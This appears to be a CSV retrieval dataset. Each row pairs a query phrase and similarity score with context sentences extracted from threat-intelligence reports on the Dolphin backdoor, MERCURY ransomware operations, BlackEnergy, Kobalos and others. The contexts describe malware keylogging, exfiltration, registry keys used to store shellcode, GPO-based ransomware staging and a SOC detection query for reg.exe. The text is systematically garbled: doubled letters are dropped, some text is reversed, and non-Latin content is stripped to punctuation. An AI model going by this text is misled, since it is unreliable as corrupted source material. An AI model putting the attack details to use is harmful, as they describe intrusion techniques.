9ab2a2b129fe2a9a6ead5e11370087f0,After the strings are decrypted,0.8903837407810357,"['ESET Research White Paper / January 2021 TLP: WHITE A WILD KOBALOS APEARS Tricksy Linux malware goes after HPCs Marc-Etiene M.Lveil Ignacio Sanmilan TABLE OF CONTENTS 1.', 'Executive sumary .', '.', '.', '.', '.', '.', '.']"
5781b38155642213a5742de08d81aefc,hardware information.,0.876021643750405,"['4-5 Figure A-1.', 'Anex C, Apendix 12 .A-16 Figure D-1.', 'Cyber mision force team alocations .', 'D-6 Figure D-2.', 'National electromagnetic spectrum operations organizational structure.', '.', 'D-9 Figure E-1.', 'Routing proces when requesting ofensive cyberspace operations suport .E-3 Figure E-2.', 'Routing proces when requesting defensive cyberspace operations-internal defensive measures suport .E-5 Figure E-3.', 'Routing proces for defensive cyberspace operations-internal defensive measures (non-Department of Defense information network) and defensive cyberspace operations-response actions suport.E-6 Figure E-4.', 'Joint tactical airstrike request form.']"
31347d89b18461f35448b26fefb00133,“cmd” /c,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,“cmd” /c,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,“cmd” /c,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
31347d89b18461f35448b26fefb00133,"""cmd"" /c",0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,"""cmd"" /c",1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,"""cmd"" /c",0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
86e2b30e1b15f290ac4419a5419c02a3,to register a scheduled task used to launch the ransomware payload.,0.7575738437910607,"['Interestingly, after each main atack step, the actors did not always imediately continue their operations but would wait weks and sometimes months before moving to the next step.', 'For execution and comunication, the threat actors leverage several C2 servers and sometimes deploy tuneling tols, such as Ligolo and OpenSH, comonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and aces to domain controlers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tols using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceded to stage the ransomware payload in the NETLOGON shares on several domain controlers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finaly, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and droped ransom notes.', 'Figure 1.', 'On-premises atack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged acounts and leverage them to manipulate the Azure Active Directory (Azure AD) Conect agent.', 'Two weks before the ransomware deployment, the threat actors first used a compromised, highly privileged acount to aces the device where the Azure Active Directory (Azure AD) Conect agent is instaled.', 'We ases with high confidence that the threat actors then used the ADInternals tol to extract the plaintext credentials of a privileged Azure AD acount.']"
86e2b30e1b15f290ac4419a5419c02a3,The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.,1.0000000000000004,"['MERCURY then handed of aces to DEV-1084.', 'It is not curently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an efects based sub-team of MERCURY that only surfaces when MERCURY operators are instructed to cary out a destructive atack.', 'Early activities, related atacker tols and techniques Microsoft aseses with moderate confidence that the threat actors atempted several times and suceded to perform initial intrusion leveraging exposed vulnerable aplications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in July 202.', 'After gaining aces, the threat actors deploy several tols and leverage techniques to maintain persistence, which provide efective and continued aces to compromised devices, such as the folowing: Instaling web shels Ading a local user acount and elevating privileges to local administrator Instaling legitimate remote aces tols, such as RPort, Ligolo and eHorus 1/10 Instaling a customized PowerShel script backdor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging comon native Windows tols and comands such as netstat and nltest.', 'Such reconaisance activities were sen leveraged throughout the atack chain.', 'The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.', 'These actions mainly involved: Remote scheduled tasks to launch their customized PowerShel backdor Windows Management Instrumentation (WMI) to launch comands on devices Remote services to run encoded PowerShel comands After infecting the new devices, the threat actors often instaled the same persistence mechanisms as described above.', 'Interestingly, after each main atack step, the actors did not always imediately continue their operations but would wait weks and sometimes months before moving to the next step.', 'For execution and comunication, the threat actors leverage several C2 servers and sometimes deploy tuneling tols, such as Ligolo and OpenSH, comonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and aces to domain controlers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tols using Group Policy Objects (GPO).']"
86e2b30e1b15f290ac4419a5419c02a3,GPO was leveraged again to register a scheduled task used to launch the ransomware payload.,1.0,"['Interestingly, after each main atack step, the actors did not always imediately continue their operations but would wait weks and sometimes months before moving to the next step.', 'For execution and comunication, the threat actors leverage several C2 servers and sometimes deploy tuneling tols, such as Ligolo and OpenSH, comonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and aces to domain controlers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tols using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceded to stage the ransomware payload in the NETLOGON shares on several domain controlers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finaly, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and droped ransom notes.', 'Figure 1.', 'On-premises atack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged acounts and leverage them to manipulate the Azure Active Directory (Azure AD) Conect agent.', 'Two weks before the ransomware deployment, the threat actors first used a compromised, highly privileged acount to aces the device where the Azure Active Directory (Azure AD) Conect agent is instaled.', 'We ases with high confidence that the threat actors then used the ADInternals tol to extract the plaintext credentials of a privileged Azure AD acount.']"
86e2b30e1b15f290ac4419a5419c02a3,first interfered with security tools using Group Policy Objects (GPO).,0.7961133831455312,"['The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.', 'These actions mainly involved: Remote scheduled tasks to launch their customized PowerShel backdor Windows Management Instrumentation (WMI) to launch comands on devices Remote services to run encoded PowerShel comands After infecting the new devices, the threat actors often instaled the same persistence mechanisms as described above.', 'Interestingly, after each main atack step, the actors did not always imediately continue their operations but would wait weks and sometimes months before moving to the next step.', 'For execution and comunication, the threat actors leverage several C2 servers and sometimes deploy tuneling tols, such as Ligolo and OpenSH, comonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and aces to domain controlers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tols using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceded to stage the ransomware payload in the NETLOGON shares on several domain controlers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finaly, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and droped ransom notes.', 'Figure 1.', 'On-premises atack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged acounts and leverage them to manipulate the Azure Active Directory (Azure AD) Conect agent.']"
86e2b30e1b15f290ac4419a5419c02a3,The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.,1.0,"['Finaly, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and droped ransom notes.', 'Figure 1.', 'On-premises atack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged acounts and leverage them to manipulate the Azure Active Directory (Azure AD) Conect agent.', 'Two weks before the ransomware deployment, the threat actors first used a compromised, highly privileged acount to aces the device where the Azure Active Directory (Azure AD) Conect agent is instaled.', 'We ases with high confidence that the threat actors then used the ADInternals tol to extract the plaintext credentials of a privileged Azure AD acount.', 'The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.', 'Azure AD Conect is an on-premises aplication for managing hybrid identities through features like pasword hash synchronization, pas-through authentication, objects synchronization, and others.', 'As part of the expres setings instalation proces, multiple acounts are created both in the on-premises (Windows Server Active Directory) and 2/10 cloud (Azure AD) environments.', 'The first acount is the AD DS Conector Acount.', 'The acount name is prefixed with MSOL_ and it is created with a long complex pasword.', 'Figure 2.']"
751a00c60e4d6cfbca29fd60f12530fc,logs keystrokes for windows with titles containing substrings specified in its configuration,0.8232163049935967,"['It creates directory listings and exfiltrates files.', 'This functionality apeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesnt exist on the victims computer Mising variable initialization some variables are asumed to be zero-initialized, or dereferenced as pointers without initialization Mising extension filtering The code is heavily based on Microsofts Portable Devices COM API code sample.', 'Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.', 'In newer versions, this capability was finished and improved by ading extension filtering.', 'For unknown reasons, the comand to retrieve specific files from portable devices was removed.', '4/8 Keyloging and screnshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.', 'The defaults are chrome and internet explore (sic).', 'This is done via the GetAsyncKeyState API, with keystrokes being loged along with the window name and curent time.', 'Screnshots are also taken at a configurable interval; the default is once every 30 seconds.', 'Screnshots and keyloging are enabled by default, and can be togled via a comand.', 'Shelcode Dolphin can receive shelcode for execution.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,can log keystrokes.,0.8656337357554038,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,can log keystrokes.,0.8656337357554038,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
751a00c60e4d6cfbca29fd60f12530fc,Screenshots are also taken at a configurable interval; the default is once every 30 seconds.,0.8437760814666565,"['In newer versions, this capability was finished and improved by ading extension filtering.', 'For unknown reasons, the comand to retrieve specific files from portable devices was removed.', '4/8 Keyloging and screnshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.', 'The defaults are chrome and internet explore (sic).', 'This is done via the GetAsyncKeyState API, with keystrokes being loged along with the window name and curent time.', 'Screnshots are also taken at a configurable interval; the default is once every 30 seconds.', 'Screnshots and keyloging are enabled by default, and can be togled via a comand.', 'Shelcode Dolphin can receive shelcode for execution.', 'The shelcode is stored in the registry, under one of the folowing keys: HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Themes\\Clasic\\<random_number> HKCU\\Software\\Microsoft\\OneDrive\\Update\\<random_number> HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\HtpsSoftware\\Microsoft\\Internet Explorer\\Zone\\<random_number> (two subkeys as one, likely a coding eror) It can be executed either localy or in a specified separate proces that is created and injected.', 'In the newer versions, the shelcode is stored in files instead of the registry, and the stored shelcode is loaded and executed on Dolphins startup, which was not the case in version 1.9 (the original version we analyzed).', 'Shel comands Dolphin can execute shel comands; this is done via the popen API and their output is retrieved.']"
751a00c60e4d6cfbca29fd60f12530fc,creates directory listings,0.7620397113400669,"['This search can be extended to fixed drives (HDs), via dedicated comands.', 'The folowing file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, pt, hwp, url, csv, pdf, show, cel, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, ptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.', 'In the newer versions, the default search was extended to fixed drives.', 'The comand to get specific files was improved, by caching/storing it in the configuration until completion.', 'Portable devices Among regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality apeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesnt exist on the victims computer Mising variable initialization some variables are asumed to be zero-initialized, or dereferenced as pointers without initialization Mising extension filtering The code is heavily based on Microsofts Portable Devices COM API code sample.', 'Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.', 'In newer versions, this capability was finished and improved by ading extension filtering.', 'For unknown reasons, the comand to retrieve specific files from portable devices was removed.', '4/8 Keyloging and screnshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.']"
751a00c60e4d6cfbca29fd60f12530fc,It creates directory listings,0.7893603267325102,"['This search can be extended to fixed drives (HDs), via dedicated comands.', 'The folowing file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, pt, hwp, url, csv, pdf, show, cel, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, ptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.', 'In the newer versions, the default search was extended to fixed drives.', 'The comand to get specific files was improved, by caching/storing it in the configuration until completion.', 'Portable devices Among regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality apeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesnt exist on the victims computer Mising variable initialization some variables are asumed to be zero-initialized, or dereferenced as pointers without initialization Mising extension filtering The code is heavily based on Microsofts Portable Devices COM API code sample.', 'Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.', 'In newer versions, this capability was finished and improved by ading extension filtering.', 'For unknown reasons, the comand to retrieve specific files from portable devices was removed.', '4/8 Keyloging and screnshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.']"
0b919e9373a287ff11d24543e7465c41,can obtain file and directory listings.,0.7556482648455891,"['Interpreter: PowerShel 6/7 Tactic ID Name Description WinorDL64 can execute further proceses using the T106 Native API CreateProcesW and CreateProcesAsUserW APIs.', 'Aces Token WinorDL64 can cal APIs WTSQueryUserToken and Manipulation: T134.02 CreateProcesAsUserW to create a proces under an Defense Create Proces with impersonated user.', 'Evasion Token Indicator Removal: T1070.04 WinorDL64 can securely remove arbitrary files.', 'File Deletion Acount Discovery: WinorDL64 can enumerate sesions and list asociated user, T1087.01 Local Acount and client names, among other details.', 'Acount Discovery: WinorDL64 can enumerate sesions and list asociated T1087.02 Domain Acount domain names among other details.', 'File and Directory T1083 WinorDL64 can obtain file and directory listings.', 'Discovery Network Share T135 WinorDL64 can discover shared network drives.', 'Discovery T1057 Proces Discovery WinorDL64 can colect information about runing proceses.', 'WinorDL64 can query the Windows registry to gather system T1012 Query Registry information.', 'WinorDL64 can obtain information such as computer name, System Information T1082 OS and latest service pack version, procesor architecture, Discovery procesor name, and amount of space on fixed drives.', 'Discovery System Location WinorDL64 can obtain the victims default country name T1614 Discovery using the GetLocaleInfoW API.']"
88d674726f92a0b205d41f6b44c23d24,Computer name,0.9939697234121188,[]
88d674726f92a0b205d41f6b44c23d24,Computer name,0.9939697234121188,[]
272d3c74c836029cd04557377079991e,Computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
272d3c74c836029cd04557377079991e,Computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
c89a6cfa1e6eb16768ede2ce52695f89,Computer name,0.7631110073603482,"['versions of the RAT including the ability to start a 204 52 Unknown.', 'comand shel, control proceses and services, 256 32 Nulterminated computername(if upload/download files, terminate TCP conections, sucesfulyobtainedfromthesystem).', 'createuseracounts, retrievesystem information, log 28 12 Procesname.', 'useractivity(viakeyloger), modifytimestamps on 30 52 0x0 bytes inalobserved files, conduct proces injection, conduct denial of comunications.', 'service atacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnexB).', 'computer.', 'Comands suported by the XShel softwarearelisted inAnexC.', '(XTiger) 38 72 0x0 bytes inalobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theproces svchost.exe isagenerichostprocesforservices 476 4 Tick count(repeated).']"
d8791e89f9eb44fcb336c885ff361602,OS version,0.7653642387849391,"['before it actualy handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself.', 'The code is wraped in 2 layers using simple crypters, so the first crypter decodes the second, and the later decodes the actual loader code.', 'htps:/research.checkpoint.com/upsynergy/ 10/24 9/6/2019 UPSynergy: Chinese-American Spy vs. Spy Story - Check Point Research Figure 14: First and second phase of decoding the loaders payload.', 'After these phases are completed, the loader starts its operation which is broken down into the folowing steps: 1.', 'Dynamic function resolution.', '2.', 'Determine the OS version.', '3.', 'Locate the SrvTreConectList in sys.', '4.', 'Extract the encoded shelcode from a Transaction object list.']"
d8791e89f9eb44fcb336c885ff361602,OS version,0.7653642387849391,"['before it actualy handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself.', 'The code is wraped in 2 layers using simple crypters, so the first crypter decodes the second, and the later decodes the actual loader code.', 'htps:/research.checkpoint.com/upsynergy/ 10/24 9/6/2019 UPSynergy: Chinese-American Spy vs. Spy Story - Check Point Research Figure 14: First and second phase of decoding the loaders payload.', 'After these phases are completed, the loader starts its operation which is broken down into the folowing steps: 1.', 'Dynamic function resolution.', '2.', 'Determine the OS version.', '3.', 'Locate the SrvTreConectList in sys.', '4.', 'Extract the encoded shelcode from a Transaction object list.']"
89fef8e793306b3786a3bba91d1bd697,OS version,0.7903239251197405,"['2 0 1 9.', '- 2 0 1 9.', '-18 2 0 1 9. , 2 , -, .', '1 , -.', 'enti- tyTypeId .', '.', '- -, .', 'JSON- -, JSON.', '2 , , .', ', .', 'JSON- data GetResult.']"
751a00c60e4d6cfbca29fd60f12530fc,"obtains various system information including OS version, computer name and RAM size.",0.812060399596744,"['Credentials from Pasword Stores: Dolphin can obtain saved paswords from Credential T15.03 Credentials from Web Browsers browsers.', 'Aces T1539 Steal Web Sesion Cokie Dolphin can obtain cokies from browsers.', 'T1010 Aplication Window Discovery Dolphin captures the title of the active window.', 'T1083 File and Directory Discovery Dolphin can obtain file and directory listings.', 'Software Discovery: Security Dolphin obtains a list of instaled security T1518.01 Software Discovery software.', 'Dolphin obtains various system information T1082 System Information Discovery including OS version, computer name and RAM size.', 'Discovery System Network Configuration Dolphin obtains the devices local and external T1016 Discovery IP adres.', 'System Network Configuration T1016.01Discovery: Internet Conection Dolphin checks internet conectivity.', 'Discovery T103 System Owner/User Discovery Dolphin obtains the victims username.', 'T124 System Time Discovery Dolphin obtains the victims curent time.', 'T1056.01Input Capture: Keyloging Dolphin can log keystrokes.']"
a9e5224d5686f541f8796eb25399c125,it creates a one-time scheduled task.,0.876156634068187,"['RESEARCH_ Docles Vietnam APT Inovacin y laboratorio April 2019 elevenpaths.com RESEARCH_ Docles Vietnam APT -A technique stil alive- Index What have we discovered?', '.', '3 Globaly Unique Identifier (GUID) .', '3 Docles DOC with thre stages .', '4 DOS OBFUSCATION .', '5 DISKLES POWERSHEL.', '6 The final stage, uninstaling yourself .']"
751a00c60e4d6cfbca29fd60f12530fc,"The content is encrypted using AES CBC with random 16-byte keys and IVs,",0.8830221976776629,"['Data staging Dolphin exfiltrates data to Gogle Drive storage, staging the data in encrypted ZIP archives before upload.', 'The backdor also maintains a list of files in the form of MD5 hashes, in order to avoid uploading the same file multiple times.', 'This list can be reset via a dedicated comand.', 'Configuration 5/8 The backdor contains an initial default configuration that is persisted on first run and loaded on subsequent runs.', 'It is stored in the file %ProgramData%\\<variable_cfg_name>.inf, where <variable_cfg_name> is randomly selected from existing filenames matching %windir%\\inf\\*.inf.', 'The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the files begining.', 'The configuration uses JSON format, with hash-like keys.', 'An example of a decrypted configuration is shown in Figure 3.', 'Figure 3.', 'Dolphin backdor configuration The configuration can be modified through comands.', 'It contains, among others, the folowing: Encryption keys Credentials for Gogle Drive API aces Window titles to keylog List of file extensions to exfiltrate Dolphin evolution Since the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdor, in which the threat actors improved the backdors capabilities and made atempts to evade detection.']"
